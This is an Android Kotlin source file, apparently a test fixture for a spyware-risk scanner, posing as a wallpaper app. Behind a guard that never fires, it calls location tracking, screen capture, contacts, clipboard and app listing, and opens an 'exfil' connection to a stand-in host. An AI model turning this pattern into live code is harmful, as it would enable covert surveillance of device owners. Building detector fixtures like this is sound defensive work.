package com.fixture.wallpaper

import android.app.Activity
import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.widget.TextView

/**
 * FIXTURE 3 — "Aurora Wallpaper" (expected: HIGH).
 *
 * INERT spyware look-alike. Location tracking, screen capture, clipboard, contacts read and the
 * network sink are referenced in bytecode but guarded behind [NEVER] and never executed.
 */
class MainActivity : Activity() {

    private val NEVER: Boolean = System.nanoTime() == 1L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val tv = TextView(this)
        tv.setPadding(48, 96, 48, 48)
        tv.text = "INERT TEST FIXTURE\n“Aurora Wallpaper” (expected: HIGH)\n\n" +
            "A wallpaper app holding location, mic, camera and contacts access. It does nothing: " +
            "the tracking, screen-capture and exfil APIs are referenced in bytecode but guarded " +
            "off. Safe to install and demo."
        setContentView(tv)
        capabilitiesNeverRun()
    }

    @Suppress("unused", "DEPRECATION", "MissingPermission")
    private fun capabilitiesNeverRun() {
        if (!NEVER) return
        // ---- compiled, never executed ----

        // Continuous location tracking
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {}
        }
        lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, listener)

        // Screen capture
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mpm.createScreenCaptureIntent()

        // Read contacts
        contentResolver.query(
            android.provider.ContactsContract.Contacts.CONTENT_URI, null, null, null, null
        )?.close()

        // Clipboard
        val clip = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        @Suppress("UNUSED_VARIABLE") val data = clip.primaryClip

        // Enumerate apps + exfil over HTTP and a raw socket
        packageManager.getInstalledPackages(0)
        val conn = java.net.URL("http://example.invalid/track")
            .openConnection() as java.net.HttpURLConnection
        conn.connect()
        java.net.Socket("127.0.0.1", 9).close()
    }
}
